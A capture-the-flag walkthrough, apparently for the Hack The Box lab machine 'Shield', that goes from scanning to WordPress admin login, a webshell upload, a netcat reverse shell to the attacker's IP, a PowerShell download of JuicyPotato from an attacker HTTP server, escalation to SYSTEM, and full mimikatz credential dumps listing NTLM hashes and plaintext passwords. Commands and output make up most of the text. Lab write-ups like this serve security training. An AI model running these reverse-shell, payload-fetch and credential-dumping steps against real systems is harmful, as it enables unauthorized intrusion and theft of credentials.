# Shield

## Ifconfig

```
inet 10.10.14.50  netmask 255.255.254.0
inet6 fe80::e5b5:1850:41bc:c2e3
```

## Nmap

> sudo nmap -sC -sV -A 10.10.10.29 | tee [nmap.log](./nmap.log)

## Nikto

> nikto -h 10.10.10.29 | tee [nikto.log](./nikto.log)

## Gobuster

> gobuster dir -u 10.10.10.29 -w /usr/share/wordlists/dirb/common.txt 2> /dev/null | tee [gobuster.log](./gobuster.log)

## Find the /wordpress dir in [gobuster](./gobuster.log)

- Enter 10.10.10.29/wordpress

login as admin

```
username: admin
password: P@s5w0rd!
```

## Upload [webshell.php](./scripts/webshell.php) from wordpress theme or plugin

- Check wordpress default uploads dir

- Add our webshell.php as postfix

```
http://10.10.10.29/wordpress/wp-content/uploads/webshell.php
```

> whoami

```
nt authority\iusr
```

> dir

```
Volume in drive C has no label. Volume Serial Number is DA1D-61AB Directory of C:\inetpub\wwwroot\wordpress\wp-content\uploads 09/21/2021 09:46 AM
. 09/21/2021 09:46 AM
.. 02/10/2020 04:07 AM 18,093 black-shield-shape-drawing-illustration-png-clip-art-150x150.png 02/10/2020 04:07 AM 20,083 black-shield-shape-drawing-illustration-png-clip-art-273x300.png 02/10/2020 04:07 AM 254,028 black-shield-shape-drawing-illustration-png-clip-art-768x844.png 02/10/2020 04:07 AM 11,676 black-shield-shape-drawing-illustration-png-clip-art.png 02/10/2020 04:07 AM 23,065 cropped-black-shield-shape-drawing-illustration-png-clip-art-150x150.png 02/10/2020 04:07 AM 36,889 cropped-black-shield-shape-drawing-illustration-png-clip-art.png 09/21/2021 12:34 AM 347,648 JPt.exe 09/21/2021 09:27 AM 347,648 memedank.exe 09/21/2021 09:26 AM 96 memeshell.bat 09/21/2021 01:05 AM 1,355,680 mz.exe 09/20/2021 10:01 PM 45,272 nc.exe 09/21/2021 12:35 AM 99 shell.bat 09/20/2021 10:46 PM 101 shhh.bat 09/21/2021 09:45 AM 591 webshell.php 14 File(s) 2,460,969 bytes 2 Dir(s) 27,565,715,456 bytes free 
```

- Uploads nc.exe if not exists in dir

*victim*

> nc.exe -nv 10.10.14.50 *port* -e cmd.exe

*attacker*

> nc -lvnp *port*

and then will get the cmd program control in local

## Cmd command test

> dir/s *history.txt

```
 Volume in drive C has no label.
 Volume Serial Number is DA1D-61AB
File Not Found
```

> systeminfo

```
Host Name:                 SHIELD
OS Name:                   Microsoft Windows Server 2016 Standard
OS Version:                10.0.14393 N/A Build 14393
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Member Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:   
Product ID:                00376-30000-00299-AA303
Original Install Date:     2/4/2020, 12:58:01 PM
System Boot Time:          9/20/2021, 9:55:06 PM
System Manufacturer:       VMware, Inc.
System Model:              VMware7,1
System Type:               x64-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~2000 Mhz
BIOS Version:              VMware, Inc. VMW71.00V.13989454.B64.1906190538, 6/19/2019
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume2
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-08:00) Pacific Time (US & Canada)
Total Physical Memory:     2,047 MB
Available Physical Memory: 837 MB
Virtual Memory: Max Size:  2,431 MB
Virtual Memory: Available: 1,196 MB
Virtual Memory: In Use:    1,235 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    MEGACORP.LOCAL
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: vmxnet3 Ethernet Adapter
                                 Connection Name: Ethernet0 2
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.29
                                 [02]: fe80::b0e7:992f:967f:c958
                                 [03]: dead:beef::b0e7:992f:967f:c958
                                 [04]: dead:beef::246
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
```

- Upload [JuicyPotato](./uploads/JuicyPotato.exe) to victim

*victim*

> powershell -c "wget http://10.10.14.50:8000/JuicyPotato.exe -o jp.exe"

*attacker*

> python -m http.server

## Juicy Potato

Argument detail:

```
Mandatory args: 
-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
-p <program>: program to launch
-l <port>: COM server listen port


Optional args: 
-m <ip>: COM server listen address (default 127.0.0.1)
-a <argument>: command line argument to pass to program (default NULL)
-k <ip>: RPC server ip address (default 127.0.0.1)
-n <port>: RPC server listen port (default 135)
-c <{clsid}>: CLSID (default BITS:{4991d34b-80a1-4291-83b6-3328366b9097})
-z only test CLSID and print token's user
```

- Find winmgmt on the [CLSID list](https://github.com/ohpe/juicy-potato/blob/master/CLSID/Windows_Server_2016_Standard/README.md)

- Try using CLSID to change auth from iusr to system

*victim*

> jp.exe -l 8000 -p %comspec% -a "/c C:\inetpub\wwwroot\wordpress\wp-content\uploads\nc.exe -nv 10.10.14.50 8002 -e cmd.exe" -t * -c "{C49E32C6-BC8B-11d2-85D4-00105A1F8304}"

```
Testing {C49E32C6-BC8B-11d2-85D4-00105A1F8304} 8000
......
[+] authresult 0
{C49E32C6-BC8B-11d2-85D4-00105A1F8304};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK
```

*attacker*

> nc -lvnp *port2*

> whoami

```
nt authority\system
```

- Cuz this os have 260 length limit, if want search where root.txt is

> dir /s root.txt >> output.txt

> type output.txt

```
Volume in drive C has no label.
Volume Serial Number is DA1D-61AB

Directory of C:\Users\Administrator\Desktop

02/25/2020  02:28 PM                32 root.txt
               1 File(s)             32 bytes

     Total Files Listed:
               1 File(s)             32 bytes
               0 Dir(s)  27,141,701,632 bytes free
```

## Finally

```
root.txt
6e9a9fdc6f64e410a68b847bb4b404fa
```

## For next session prepare

- Need [mimikatz](./uploads/mimikatz/x64) to get NTLM hash and logonpassword

- Use systeminfo to know this is x64 windows

## With mimikatz launched

- Get the NTLM hash

> mimikatz # lsadump::sam

```
Domain : SHIELD
SysKey : 20890fa588f64b65b11618bb769375e4
Local SID : S-1-5-21-3725850506-2982801121-2592019786

SAMKey : ee9c5f773ec35d5e52dac514bf15bb81

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: fddbe11372750166707da95aa4b4cc14

RID  : 000001f5 (501)
User : Guest

RID  : 000001f7 (503)
User : DefaultAccount
```

- Get the password of login info

> mimikatz # sekurlsa::logonPasswords

```
Authentication Id : 0 ; 314973 (00000000:0004ce5d)
Session           : Interactive from 1
User Name         : sandra
Domain            : MEGACORP
Logon Server      : PATHFINDER
Logon Time        : 9/21/2021 2:00:38 PM
SID               : S-1-5-21-1035856440-4137329016-3276773158-1105
	msv :	
	 [00000003] Primary
	 * Username : sandra
	 * Domain   : MEGACORP
	 * NTLM     : 29ab86c5c4d2aab957763e5c1720486d
	 * SHA1     : 8bd0ccc2a23892a74dfbbbb57f0faa9721562a38
	 * DPAPI    : f4c73b3f07c4f309ebf086644254bcbc
	tspkg :	
	wdigest :	
	 * Username : sandra
	 * Domain   : MEGACORP
	 * Password : (null)
	kerberos :	
	 * Username : sandra
	 * Domain   : MEGACORP.LOCAL
	 * Password : Password1234!
	ssp :	
	credman :	

Authentication Id : 0 ; 178423 (00000000:0002b8f7)
Session           : Service from 0
User Name         : wordpress
Domain            : IIS APPPOOL
Logon Server      : (null)
Logon Time        : 9/21/2021 1:59:41 PM
SID               : S-1-5-82-698136220-2753279940-1413493927-70316276-1736946139
	msv :	
	 [00000003] Primary
	 * Username : SHIELD$
	 * Domain   : MEGACORP
	 * NTLM     : 9d4feee71a4f411bf92a86b523d64437
	 * SHA1     : 0ee4dc73f1c40da71a60894eff504cc732de82da
	tspkg :	
	wdigest :	
	 * Username : SHIELD$
	 * Domain   : MEGACORP
	 * Password : (null)
	kerberos :	
	 * Username : SHIELD$
	 * Domain   : MEGACORP.LOCAL
	 * Password : cw)_#JH _gA:]UqNu4XiN`yA'9Z'OuYCxXl]30fY1PaK,AL#ndtjq?]h_8<Kx'\*9e<s`ZV uNjoe Q%\_mX<Eo%lB:NM6@-a+qJt_l887Ew&m_ewr??#VE&
	ssp :	
	credman :	

Authentication Id : 0 ; 168007 (00000000:00029047)
Session           : Service from 0
User Name         : DefaultAppPool
Domain            : IIS APPPOOL
Logon Server      : (null)
Logon Time        : 9/21/2021 1:59:37 PM
SID               : S-1-5-82-3006700770-424185619-1745488364-794895919-4004696415
	msv :	
	 [00000003] Primary
	 * Username : SHIELD$
	 * Domain   : MEGACORP
	 * NTLM     : 9d4feee71a4f411bf92a86b523d64437
	 * SHA1     : 0ee4dc73f1c40da71a60894eff504cc732de82da
	tspkg :	
	wdigest :	
	 * Username : SHIELD$
	 * Domain   : MEGACORP
	 * Password : (null)
	kerberos :	
	 * Username : SHIELD$
	 * Domain   : MEGACORP.LOCAL
	 * Password : cw)_#JH _gA:]UqNu4XiN`yA'9Z'OuYCxXl]30fY1PaK,AL#ndtjq?]h_8<Kx'\*9e<s`ZV uNjoe Q%\_mX<Eo%lB:NM6@-a+qJt_l887Ew&m_ewr??#VE&
	ssp :	
	credman :	

Authentication Id : 0 ; 66485 (00000000:000103b5)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 9/21/2021 1:59:20 PM
SID               : S-1-5-90-0-1
	msv :	
	 [00000003] Primary
	 * Username : SHIELD$
	 * Domain   : MEGACORP
	 * NTLM     : 9d4feee71a4f411bf92a86b523d64437
	 * SHA1     : 0ee4dc73f1c40da71a60894eff504cc732de82da
	tspkg :	
	wdigest :	
	 * Username : SHIELD$
	 * Domain   : MEGACORP
	 * Password : (null)
	kerberos :	
	 * Username : SHIELD$
	 * Domain   : MEGACORP.LOCAL
	 * Password : cw)_#JH _gA:]UqNu4XiN`yA'9Z'OuYCxXl]30fY1PaK,AL#ndtjq?]h_8<Kx'\*9e<s`ZV uNjoe Q%\_mX<Eo%lB:NM6@-a+qJt_l887Ew&m_ewr??#VE&
	ssp :	
	credman :	

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : SHIELD$
Domain            : MEGACORP
Logon Server      : (null)
Logon Time        : 9/21/2021 1:59:20 PM
SID               : S-1-5-20
	msv :	
	 [00000003] Primary
	 * Username : SHIELD$
	 * Domain   : MEGACORP
	 * NTLM     : 9d4feee71a4f411bf92a86b523d64437
	 * SHA1     : 0ee4dc73f1c40da71a60894eff504cc732de82da
	tspkg :	
	wdigest :	
	 * Username : SHIELD$
	 * Domain   : MEGACORP
	 * Password : (null)
	kerberos :	
	 * Username : shield$
	 * Domain   : MEGACORP.LOCAL
	 * Password : cw)_#JH _gA:]UqNu4XiN`yA'9Z'OuYCxXl]30fY1PaK,AL#ndtjq?]h_8<Kx'\*9e<s`ZV uNjoe Q%\_mX<Eo%lB:NM6@-a+qJt_l887Ew&m_ewr??#VE&
	ssp :	
	credman :	

Authentication Id : 0 ; 995 (00000000:000003e3)
Session           : Service from 0
User Name         : IUSR
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 9/21/2021 1:59:24 PM
SID               : S-1-5-17
	msv :	
	tspkg :	
	wdigest :	
	 * Username : (null)
	 * Domain   : (null)
	 * Password : (null)
	kerberos :	
	 * Username : IUSR
	 * Domain   : NT AUTHORITY
	 * Password : (null)
	ssp :	
	credman :	

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 9/21/2021 1:59:20 PM
SID               : S-1-5-19
	msv :	
	tspkg :	
	wdigest :	
	 * Username : (null)
	 * Domain   : (null)
	 * Password : (null)
	kerberos :	
	 * Username : (null)
	 * Domain   : (null)
	 * Password : (null)
	ssp :	
	credman :	

Authentication Id : 0 ; 66822 (00000000:00010506)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 9/21/2021 1:59:20 PM
SID               : S-1-5-90-0-1
	msv :	
	 [00000003] Primary
	 * Username : SHIELD$
	 * Domain   : MEGACORP
	 * NTLM     : 9d4feee71a4f411bf92a86b523d64437
	 * SHA1     : 0ee4dc73f1c40da71a60894eff504cc732de82da
	tspkg :	
	wdigest :	
	 * Username : SHIELD$
	 * Domain   : MEGACORP
	 * Password : (null)
	kerberos :	
	 * Username : SHIELD$
	 * Domain   : MEGACORP.LOCAL
	 * Password : cw)_#JH _gA:]UqNu4XiN`yA'9Z'OuYCxXl]30fY1PaK,AL#ndtjq?]h_8<Kx'\*9e<s`ZV uNjoe Q%\_mX<Eo%lB:NM6@-a+qJt_l887Ew&m_ewr??#VE&
	ssp :	
	credman :	

Authentication Id : 0 ; 36372 (00000000:00008e14)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 9/21/2021 1:59:19 PM
SID               : 
	msv :	
	 [00000003] Primary
	 * Username : SHIELD$
	 * Domain   : MEGACORP
	 * NTLM     : 9d4feee71a4f411bf92a86b523d64437
	 * SHA1     : 0ee4dc73f1c40da71a60894eff504cc732de82da
	tspkg :	
	wdigest :	
	kerberos :	
	ssp :	
	credman :	

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : SHIELD$
Domain            : MEGACORP
Logon Server      : (null)
Logon Time        : 9/21/2021 1:59:19 PM
SID               : S-1-5-18
	msv :	
	tspkg :	
	wdigest :	
	 * Username : SHIELD$
	 * Domain   : MEGACORP
	 * Password : (null)
	kerberos :	
	 * Username : shield$
	 * Domain   : MEGACORP.LOCAL
	 * Password : cw)_#JH _gA:]UqNu4XiN`yA'9Z'OuYCxXl]30fY1PaK,AL#ndtjq?]h_8<Kx'\*9e<s`ZV uNjoe Q%\_mX<Eo%lB:NM6@-a+qJt_l887Ew&m_ewr??#VE&
	ssp :	
	credman :	
```
